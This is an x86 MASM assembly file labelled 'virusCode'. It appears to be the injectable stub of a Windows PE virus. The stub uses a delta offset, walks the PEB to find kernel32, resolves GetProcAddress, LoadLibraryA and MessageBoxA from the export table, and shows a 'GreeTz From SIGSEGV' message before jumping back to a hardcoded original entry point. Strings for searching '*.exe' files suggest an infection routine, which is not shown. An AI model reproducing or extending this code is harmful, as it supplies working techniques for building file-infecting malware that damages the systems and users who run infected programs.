.586
.model flat,stdcall
option casemap:none

   include windows.inc
   include user32.inc
   include kernel32.inc
   include masm32.inc
   include masm32rt.inc
   
   includelib user32.lib
   includelib kernel32.lib
   includelib masm32.lib
   
.data
FindFirstFileError              		BYTE                        "FindFirstFile failed ", 0
FindFirstFileSuccess            		BYTE                        "First file found with success ", 0
FindNextFileError               		BYTE                        "FindNextFile failed ", 0
FindNextFileSuccess             		BYTE                        "FirstNextFile found with success ", 0
FolderFound           		  		BYTE                        "Folder found", 0
EndObjecTable					BYTE				    "End of object table",0

fileFilter 						db 							"*.*",0
backDir 						db 							"..",0
exeFilter 						db 							"*.exe",0
path 							BYTE 						      "C:\Documents and Settings\F.U.C.K\Desktop\test\",0
count 						db 							0

.data?
validPE						dd							?
hDir 							db 							256 dup (?)
ErrorCode                                 DWORD                       			? 

.code
; -----------------------------------;
virusCode:
	pushad
	call delta
delta: 
	pop ebp
	mov eax,ebp
	sub ebp,delta

	assume fs:nothing
	mov ebx,[fs:48]
	mov ebx,[ebx+12]
	mov ebx,[ebx+20]
	mov ebx,[ebx]
	mov ebx,[ebx]
	mov ebx,[ebx+16]
	mov [ebp+dwKernelBase] , ebx
    	add ebx, [ebx+60] ; Start of PE header
    	mov ebx, [ebx+120] ; RVA of export dir
   	add ebx, [ebp+dwKernelBase]  ; VA of export dir
  	mov [ebp+dwExportDirectory] , ebx
 
    lea edx,[ebp+api_GetProcAddress]
    mov ecx,[ebp+len_GetProcAddress]
    call GetFunctionAddress
    mov [ebp+AGetProcAddressA] , eax
    lea edx,[ebp+api_LoadLibrary]
    push edx
    push dword ptr[ebp+dwKernelBase]
    call eax
    mov [ebp+ALoadLibraryA] , eax
    lea edx , [ebp+szUser32]
    push edx
    call eax
    lea edx , [ebp+api_MessageBoxA]
    push edx
    push eax
    mov ebx,[ebp+AGetProcAddressA]
    call ebx
    mov [ebp+AMessageBoxAA] , eax
 
    push 0
    lea edx,[ebp+szTitle]
    push edx
    lea edx,[ebp+szMsg]
    push edx
    push 0
    call eax
    popad
 
    push 3149642683  ;OEP
    retn
 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;     <<<<< GetFunctionAddress >>>>>>                                          ;
;    Extracts Function Address From Export Directory and returns it in eax      ;
;    Parameters :  Function name in edx , Length in ecx                       ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
GetFunctionAddress:
    push ebx
    push esi
    push edi
 
    mov esi, [ebp+dwExportDirectory]
    mov esi, [esi+32] ;RVA of ENT
    add esi, [ebp+dwKernelBase]  ;VA of ENT
    xor ebx,ebx
    cld
 
    looper:
          inc ebx
          lodsd
          add eax , [ebp+dwKernelBase]   ;eax now points to the string of a function
          push esi      ;preserve it for the outer loop
          mov esi,eax
          mov edi,edx
          cld
          push ecx
          repe cmpsb
          pop ecx
          pop esi
          jne looper
 
          dec ebx
          mov eax,[ebp+dwExportDirectory]
          mov eax,[eax+36]       ;RVA of EOT
          add eax,[ebp+dwKernelBase]     ;VA of EOT
          movzx eax , word ptr [ebx*2+eax]  ;eax now holds the ordinal of our function
          mov ebx,[ebp+dwExportDirectory]
          mov ebx,[ebx+28]       ;RVA of EAT
          add ebx,[ebp+dwKernelBase]     ;VA of EAT
          mov ebx,[eax*4+ebx]
          add ebx,[ebp+dwKernelBase]
          mov eax,ebx
 
        pop edi
        pop esi
        pop ebx
        ret
 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;   Data Shit                   ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
szTitle            db      "Yo !",0
szMsg              db      "GreeTz From SIGSEGV",0
szUser32            db    "User32.dll",0
AGetProcAddressA           dd    0
api_GetProcAddress         db    "GetProcAddress"
len_GetProcAddress        dd    $-api_GetProcAddress
ALoadLibraryA          dd    0
api_LoadLibrary        db    "LoadLibraryA",0
AMessageBoxAA          dd    0
api_MessageBoxA        db    "MessageBoxA",0
dwKernelBase          dd    0
dwExportDirectory          dd    0

end virusCode